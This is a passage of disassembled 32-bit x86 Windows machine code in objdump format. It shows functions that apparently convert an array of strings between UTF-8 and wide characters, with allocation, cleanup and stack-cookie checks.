  4048d0:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  4048d4:	51                   	push   %ecx
  4048d5:	68 00 04 00 00       	push   $0x400
  4048da:	50                   	push   %eax
  4048db:	6a 00                	push   $0x0
  4048dd:	68 00 10 00 00       	push   $0x1000
  4048e2:	ff 15 4c 00 42 00    	call   *0x42004c
  4048e8:	85 c0                	test   %eax,%eax
  4048ea:	75 2c                	jne    0x404918
  4048ec:	68 4c 16 42 00       	push   $0x42164c
  4048f1:	68 6c 16 42 00       	push   $0x42166c
  4048f6:	e8 05 d0 ff ff       	call   0x401900
  4048fb:	83 c4 08             	add    $0x8,%esp
  4048fe:	b8 7c 16 42 00       	mov    $0x42167c,%eax
  404903:	8b 8c 24 00 20 00 00 	mov    0x2000(%esp),%ecx
  40490a:	33 cc                	xor    %esp,%ecx
  40490c:	e8 53 31 00 00       	call   0x407a64
  404911:	81 c4 04 20 00 00    	add    $0x2004,%esp
  404917:	c3                   	ret
  404918:	68 00 10 00 00       	push   $0x1000
  40491d:	8d 44 24 04          	lea    0x4(%esp),%eax
  404921:	50                   	push   %eax
  404922:	68 68 8a 43 00       	push   $0x438a68
  404927:	e8 94 04 00 00       	call   0x404dc0
  40492c:	83 c4 0c             	add    $0xc,%esp
  40492f:	b9 a0 16 42 00       	mov    $0x4216a0,%ecx
  404934:	85 c0                	test   %eax,%eax
  404936:	ba 68 8a 43 00       	mov    $0x438a68,%edx
  40493b:	0f 45 ca             	cmovne %edx,%ecx
  40493e:	8b c1                	mov    %ecx,%eax
  404940:	8b 8c 24 00 20 00 00 	mov    0x2000(%esp),%ecx
  404947:	33 cc                	xor    %esp,%ecx
  404949:	e8 16 31 00 00       	call   0x407a64
  40494e:	81 c4 04 20 00 00    	add    $0x2004,%esp
  404954:	c3                   	ret
  404955:	cc                   	int3
  404956:	cc                   	int3
  404957:	cc                   	int3
  404958:	cc                   	int3
  404959:	cc                   	int3
  40495a:	cc                   	int3
  40495b:	cc                   	int3
  40495c:	cc                   	int3
  40495d:	cc                   	int3
  40495e:	cc                   	int3
  40495f:	cc                   	int3
  404960:	6a 00                	push   $0x0
  404962:	ff 74 24 0c          	push   0xc(%esp)
  404966:	ff 74 24 0c          	push   0xc(%esp)
  40496a:	e8 11 00 00 00       	call   0x404980
  40496f:	83 c4 0c             	add    $0xc,%esp
  404972:	c3                   	ret
  404973:	cc                   	int3
  404974:	cc                   	int3
  404975:	cc                   	int3
  404976:	cc                   	int3
  404977:	cc                   	int3
  404978:	cc                   	int3
  404979:	cc                   	int3
  40497a:	cc                   	int3
  40497b:	cc                   	int3
  40497c:	cc                   	int3
  40497d:	cc                   	int3
  40497e:	cc                   	int3
  40497f:	cc                   	int3
  404980:	83 ec 08             	sub    $0x8,%esp
  404983:	53                   	push   %ebx
  404984:	55                   	push   %ebp
  404985:	56                   	push   %esi
  404986:	8b 74 24 18          	mov    0x18(%esp),%esi
  40498a:	57                   	push   %edi
  40498b:	6a 04                	push   $0x4
  40498d:	8d 46 01             	lea    0x1(%esi),%eax
  404990:	50                   	push   %eax
  404991:	e8 c8 8e 00 00       	call   0x40d85e
  404996:	83 c4 08             	add    $0x8,%esp
  404999:	89 44 24 10          	mov    %eax,0x10(%esp)
  40499d:	33 ff                	xor    %edi,%edi
  40499f:	85 f6                	test   %esi,%esi
  4049a1:	0f 8e e7 00 00 00    	jle    0x404a8e
  4049a7:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  4049ab:	8b d8                	mov    %eax,%ebx
  4049ad:	2b c8                	sub    %eax,%ecx
  4049af:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  4049b3:	8b 04 19             	mov    (%ecx,%ebx,1),%eax
  4049b6:	6a 00                	push   $0x0
  4049b8:	6a 00                	push   $0x0
  4049ba:	6a ff                	push   $0xffffffff
  4049bc:	50                   	push   %eax
  4049bd:	6a 00                	push   $0x0
  4049bf:	68 e9 fd 00 00       	push   $0xfde9
  4049c4:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  4049c8:	ff 15 54 00 42 00    	call   *0x420054
  4049ce:	8b e8                	mov    %eax,%ebp
  4049d0:	85 ed                	test   %ebp,%ebp
  4049d2:	74 71                	je     0x404a45
  4049d4:	8d 4d 01             	lea    0x1(%ebp),%ecx
  4049d7:	6a 02                	push   $0x2
  4049d9:	51                   	push   %ecx
  4049da:	e8 7f 8e 00 00       	call   0x40d85e
  4049df:	83 c4 08             	add    $0x8,%esp
  4049e2:	8b f0                	mov    %eax,%esi
  4049e4:	55                   	push   %ebp
  4049e5:	56                   	push   %esi
  4049e6:	6a ff                	push   $0xffffffff
  4049e8:	ff 74 24 20          	push   0x20(%esp)
  4049ec:	6a 00                	push   $0x0
  4049ee:	68 e9 fd 00 00       	push   $0xfde9
  4049f3:	ff 15 54 00 42 00    	call   *0x420054
  4049f9:	85 c0                	test   %eax,%eax
  4049fb:	74 41                	je     0x404a3e
  4049fd:	85 f6                	test   %esi,%esi
  4049ff:	74 56                	je     0x404a57
  404a01:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  404a06:	56                   	push   %esi
  404a07:	74 07                	je     0x404a10
  404a09:	e8 d2 05 00 00       	call   0x404fe0
  404a0e:	eb 05                	jmp    0x404a15
  404a10:	e8 3b 05 00 00       	call   0x404f50
  404a15:	83 c4 04             	add    $0x4,%esp
  404a18:	8b e8                	mov    %eax,%ebp
  404a1a:	56                   	push   %esi
  404a1b:	e8 36 52 00 00       	call   0x409c56
  404a20:	83 c4 04             	add    $0x4,%esp
  404a23:	85 ed                	test   %ebp,%ebp
  404a25:	74 30                	je     0x404a57
  404a27:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  404a2b:	47                   	inc    %edi
  404a2c:	89 2b                	mov    %ebp,(%ebx)
  404a2e:	83 c3 04             	add    $0x4,%ebx
  404a31:	3b fe                	cmp    %esi,%edi
  404a33:	7d 55                	jge    0x404a8a
  404a35:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  404a39:	e9 75 ff ff ff       	jmp    0x4049b3
  404a3e:	68 d8 17 42 00       	push   $0x4217d8
  404a43:	eb 05                	jmp    0x404a4a
  404a45:	68 a0 17 42 00       	push   $0x4217a0
  404a4a:	68 c4 17 42 00       	push   $0x4217c4
  404a4f:	e8 ac ce ff ff       	call   0x401900
  404a54:	83 c4 08             	add    $0x8,%esp
  404a57:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  404a5d:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  404a61:	33 f6                	xor    %esi,%esi
  404a63:	85 ff                	test   %edi,%edi
  404a65:	78 10                	js     0x404a77
  404a67:	ff 34 b3             	push   (%ebx,%esi,4)
  404a6a:	e8 e7 51 00 00       	call   0x409c56
  404a6f:	46                   	inc    %esi
  404a70:	83 c4 04             	add    $0x4,%esp
  404a73:	3b f7                	cmp    %edi,%esi
  404a75:	7e f0                	jle    0x404a67
  404a77:	53                   	push   %ebx
  404a78:	e8 d9 51 00 00       	call   0x409c56
  404a7d:	83 c4 04             	add    $0x4,%esp
  404a80:	33 c0                	xor    %eax,%eax
  404a82:	5f                   	pop    %edi
  404a83:	5e                   	pop    %esi
  404a84:	5d                   	pop    %ebp
  404a85:	5b                   	pop    %ebx
  404a86:	83 c4 08             	add    $0x8,%esp
  404a89:	c3                   	ret
  404a8a:	8b 44 24 10          	mov    0x10(%esp),%eax
  404a8e:	5f                   	pop    %edi
  404a8f:	c7 04 b0 00 00 00 00 	movl   $0x0,(%eax,%esi,4)
  404a96:	5e                   	pop    %esi
  404a97:	5d                   	pop    %ebp
  404a98:	5b                   	pop    %ebx
  404a99:	83 c4 08             	add    $0x8,%esp
  404a9c:	c3                   	ret
  404a9d:	cc                   	int3
  404a9e:	cc                   	int3
  404a9f:	cc                   	int3
  404aa0:	83 ec 08             	sub    $0x8,%esp
  404aa3:	53                   	push   %ebx
  404aa4:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  404aa8:	55                   	push   %ebp
  404aa9:	56                   	push   %esi
  404aaa:	57                   	push   %edi
  404aab:	8d 43 01             	lea    0x1(%ebx),%eax
  404aae:	6a 04                	push   $0x4
  404ab0:	50                   	push   %eax
  404ab1:	e8 a8 8d 00 00       	call   0x40d85e
  404ab6:	83 c4 08             	add    $0x8,%esp
  404ab9:	33 ff                	xor    %edi,%edi
  404abb:	8b e8                	mov    %eax,%ebp
  404abd:	85 db                	test   %ebx,%ebx
  404abf:	0f 8e c4 00 00 00    	jle    0x404b89
  404ac5:	8b 44 24 20          	mov    0x20(%esp),%eax
  404ac9:	8b f5                	mov    %ebp,%esi
  404acb:	2b c5                	sub    %ebp,%eax
